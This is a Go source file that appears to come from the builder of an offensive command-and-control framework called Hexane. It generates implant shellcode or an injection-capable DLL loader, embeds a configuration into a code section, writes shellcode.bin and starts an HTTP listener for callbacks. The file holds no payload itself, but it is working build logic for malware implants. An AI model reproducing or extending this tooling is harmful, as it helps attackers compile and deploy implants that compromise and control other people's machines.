package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
)

const (
	BUILD_TYPE_SHELLCODE = 0
	BUILD_TYPE_DLL       = 1
)

var (
	BuildPath   = path.Join(RootDirectory, "build")
	ConfigsPath = path.Join(RootDirectory, "configs")
	CorePath    = path.Join(RootDirectory, "core")
	LogsPath    = path.Join(RootDirectory, "logs")
	LoaderPath  = path.Join(RootDirectory, "loader")
	ImplantPath = path.Join(RootDirectory, "implant")
	HashHeader  = path.Join(CorePath, "include/names.hpp")
	HashStrings = path.Join(ConfigsPath, "strings.txt")
)

func (h *HexaneConfig) GetModuleConfig(config *JsonConfig) *Module {
	var (
		err       error
		transport string
	)

	if transport, err = h.GetTransportType(); err != nil {
		return nil
	}

	module := &Module{
		RootDirectory: config.Builder.RootDirectory,
		OutputName:    config.Builder.OutputName,
		LinkerScript:  config.Builder.LinkerScript,
		Definitions:   map[string][]byte{transport: nil},

		Files: &Sources{
			Sources:            config.Builder.Sources,
			Dependencies:       config.Builder.Dependencies,
			IncludeDirectories: []string{RootDirectory, config.Builder.RootDirectory},
		},

		Loader: &Loader{
			RootDirectory: config.Builder.Loader.RootDirectory,
			LinkerScript:  config.Builder.Loader.LinkerScript,
			RsrcScript:    config.Builder.Loader.RsrcScript,
			RsrcBinary:    config.Builder.Loader.RsrcBinary,
			Sources:       config.Builder.Loader.Sources,
			Injection:     config.Builder.Loader.Injection,
		},
	}

	if config.Builder.Loader == nil {
		module.BuildType = BUILD_TYPE_SHELLCODE
	} else {
		module.BuildType = BUILD_TYPE_DLL
	}

	return module
}

func (h *HexaneConfig) BuildSource() error {
	var (
		err    error
		module *Module
	)

	if module = h.GetModuleConfig(h.UserConfig); module == nil {
		return fmt.Errorf("module config is nil")
	}

	if module.LinkerScript != "" {
		module.LinkerScript = filepath.Join(module.RootDirectory, module.LinkerScript)
	}

	if err = h.BuildSources(module); err != nil {
		return err
	}

	if err = h.EmbedSectionData(module.OutputName, ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	if err = h.CopySectionData(module.OutputName, path.Join(h.Compiler.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) RunBuild() error {
	var err error

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	WrapMessage("DBG", "generating implant\n")
	if err = h.BuildSource(); err != nil {
		return err
	}

	profile := h.UserConfig.Network.Config.(*Http)
	profile.Success = make(chan bool)

	go func() {
		err = h.HttpServerHandler()
	}()

	<-profile.Success
	if err != nil {
		return err
	}

	AddConfig(h)
	return nil
}
